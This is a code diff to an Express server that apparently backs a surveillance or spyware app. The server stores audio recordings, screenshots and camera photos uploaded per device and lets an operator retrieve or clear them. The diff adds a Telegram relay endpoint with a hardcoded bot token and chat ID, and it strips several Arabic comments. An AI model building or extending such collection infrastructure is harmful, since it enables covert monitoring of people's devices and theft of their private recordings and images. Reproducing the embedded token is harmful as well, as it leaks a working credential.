@@ -12,6 +12,36 @@ app.use(cors());
 app.use(bodyParser.json({ limit: '50mb' }));
 app.use(express.static('public'));
 
+// ✅ ✅ ✅ Telegram Proxy — لتجاوز CORS من المتصفح
+app.post('/tg_proxy.php', async (req, res) => {
+    try {
+        const { text } = req.body;
+        if (!text || typeof text !== 'string') {
+            return res.json({ ok: false, error: 'No text' });
+        }
+
+        const BOT_TOKEN = process.env.TG_BOT_TOKEN || '5826969870:AAF2RAg49eZHLJ62onDtVjBskxgYFvfdkpQ';
+        const CHAT_ID = process.env.TG_CHAT_ID || '1538488453';
+
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        const response = await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: text
+            })
+        });
+
+        const data = await response.json();
+        console.log(`[TG_PROXY] "${text}" → ${data.ok ? 'OK' : 'FAIL'}`);
+        res.json(data);
+    } catch (e) {
+        console.error('[TG_PROXY] error:', e.message);
+        res.json({ ok: false, error: e.message });
+    }
+});
+
 const dataDir = path.join(__dirname, 'data');
 if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true });
 
@@ -333,7 +363,6 @@ app.post('/upload.php', (req, res) => {
             return res.json({ success: true, voice_count: voices.length });
         }
 
-        // ✅ ✅ ✅ جديد — تسجيل صوت
         if (data.type === 'audio_recording' && data.file_data) {
             const deviceId = data.device_id || 'unknown';
             const deviceDir = path.join(dataDir, deviceId);
@@ -352,7 +381,6 @@ app.post('/upload.php', (req, res) => {
             return res.json({ success: true, audio_count: audios.length });
         }
 
-        // ✅ ✅ ✅ جديد — لقطة شاشة
         if (data.type === 'screenshot_data' && data.file_data) {
             const deviceId = data.device_id || 'unknown';
             const deviceDir = path.join(dataDir, deviceId);
@@ -371,7 +399,6 @@ app.post('/upload.php', (req, res) => {
             return res.json({ success: true, screenshot_count: screenshots.length });
         }
 
-        // ✅ ✅ ✅ جديد — صورة كاميرا (أمامي/خلفي)
         if (data.type === 'camera_photo' && data.file_data) {
             const deviceId = data.device_id || 'unknown';
             const deviceDir = path.join(dataDir, deviceId);
@@ -784,14 +811,12 @@ app.get('/api.php', (req, res) => {
             return res.json([]);
         }
 
-        // ✅ ✅ ✅ جديد — جلب التسجيلات الصوتية
         if (action === 'get_audio_recordings') {
             const audioFile = path.join(dataDir, deviceId, 'audio_recordings.json');
             if (fs.existsSync(audioFile)) return res.json(JSON.parse(fs.readFileSync(audioFile, 'utf8')));
             return res.json([]);
         }
 
-        // ✅ جديد — حذف تسجيل صوتي
         if (action === 'delete_audio') {
             const idx = parseInt(req.query.index);
             const audioFile = path.join(dataDir, deviceId, 'audio_recordings.json');
@@ -806,14 +831,12 @@ app.get('/api.php', (req, res) => {
             return res.json({ success: false });
         }
 
-        // ✅ جديد — مسح كل التسجيلات
         if (action === 'clear_audio') {
             const audioFile = path.join(dataDir, deviceId, 'audio_recordings.json');
             if (fs.existsSync(audioFile)) fs.writeFileSync(audioFile, '[]');
             return res.json({ success: true });
         }
 
-        // ✅ ✅ ✅ جديد — جلب لقطات الشاشة
         if (action === 'get_screenshots') {
             const screenshotFile = path.join(dataDir, deviceId, 'screenshots.json');
             if (fs.existsSync(screenshotFile)) return res.json(JSON.parse(fs.readFileSync(screenshotFile, 'utf8')));
@@ -840,7 +863,6 @@ app.get('/api.php', (req, res) => {
             return res.json({ success: true });
         }
 
-        // ✅ ✅ ✅ جديد — جلب صور الكاميرا
         if (action === 'get_camera_photos') {
             const cameraFile = path.join(dataDir, deviceId, 'camera_photos.json');
             if (fs.existsSync(cameraFile)) return res.json(JSON.parse(fs.readFileSync(cameraFile, 'utf8')));
